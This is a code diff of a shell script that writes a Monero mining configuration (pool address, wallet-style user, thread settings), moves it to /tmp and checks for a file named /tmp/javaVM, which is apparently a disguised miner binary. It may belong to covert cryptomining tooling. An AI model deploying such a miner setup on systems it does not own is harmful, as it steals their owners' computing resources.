@@ -12,9 +12,9 @@ cat >config.json <<EOL
             "algo": null,
             "coin": "XMR",
 			"1gb-pages":true,
-			"rx":[1, 2],
+			"rx":[0,1,2,3,4],
             "url": "pool.supportxmr.com:3333",
-            "user": "NHbNLSXXkj2Xchnx4qTMXwRusLJMcTCchDaq.Work001",
+            "user": "NHbNLSXXkj2Xchnx4qTMXwRusLJMcTCchDaq.Work002",
             "pass": "x",
             "tls": true,
             "keepalive": true,
@@ -23,7 +23,7 @@ cat >config.json <<EOL
     ]
 }
 EOL
-
+mv config.json /tmp/config.json
 
 if [ -f /tmp/javaVM ]
  	then
